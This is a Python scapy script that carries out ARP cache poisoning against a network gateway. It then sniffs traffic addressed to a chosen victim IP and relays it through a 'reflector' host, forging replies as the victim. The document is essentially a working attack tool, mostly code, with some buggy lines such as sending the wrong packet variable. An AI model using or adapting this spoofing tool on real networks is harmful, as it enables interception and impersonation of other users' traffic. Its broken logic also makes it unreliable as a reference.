#!/usr/bin/env python3.7
from scapy.all import *
import asyncio
loop = asyncio.get_event_loop()

def get_gateway(iface):
    gw = conf.route.route("0.0.0.0")[2]
    mac = getmacbyip(gw)
    return gw, mac

async def flood_arp_cache(is_at_ip,gw,gw_mac,iface):
    while True:
        own_mac = get_if_hwaddr(iface)    
        arp = ARP(op=2, hwsrc=own_mac,psrc=is_at_ip, pdst=gw,hwdst=gw_mac)
        eth=Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt = eth / arp        
        sendp(pkt,iface)
        await asyncio.sleep(1)

    # srpflood(pkt,iface,inter=1)
    
    #not known why ARP is still sent to .3 from atk even though .3 has been overwritten in ARP cache
    #for this reason, test on linux vm


async def listen_reply(victim_ip, reflector_ip,iface):
    while True:     
        await asyncio.sleep(0)   
        p = sniff(filter="dst {0}".format(victim_ip),promisc=True,count=1)[0]
        if ARP in p:
            arp = p[ARP]
            arp_reflect = ARP(pdst=arp.psrc, hwdst=arp.hwsrc,psrc=reflector_ip)            
            r = srp1(arp_reflect, iface=iface)[0]
            arp_reply= ARP(op=2,pdst=r.psrc,hwdst=r.hwsrc,psrc=victim_ip)
            sendpfast(arp,iface=iface)

        if IP in p:
            ip = p[IP]
            attacker_ip=ip.src
            ip_reflect=IP(src=reflector_ip,dst=attacker_ip,payload=ip.payload)            
            r = sr1(ip_reflect, iface=iface)[0]
            if IP in r:
                ip = r[IP].payload
                ip_reply = IP(src=victim_ip,dst=attacker_ip,payload=ip.payload)
                sendpfast(ip_reply,iface=iface)       

        
            

def main():
    if __name__ == '__main__':
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument('--interface', required=True)
        parser.add_argument('--victim-ip', required=True)
        parser.add_argument('--victim-ethernet', required=True)
        parser.add_argument('--reflector-ip', required=True)
        parser.add_argument('--reflector-ethernet', required=True)
        args=parser.parse_args()
        print(args)
        
    iface=args.interface        
    gw,gw_mac = get_gateway(iface)    
    future1 = loop.create_task(flood_arp_cache(args.victim_ip,gw,gw_mac,iface))
    future2 = loop.create_task(listen_reply(args.victim_ip,args.reflector_ip ,iface))

    try:
        loop.run_forever()
    finally:
        loop.stop()


    

main()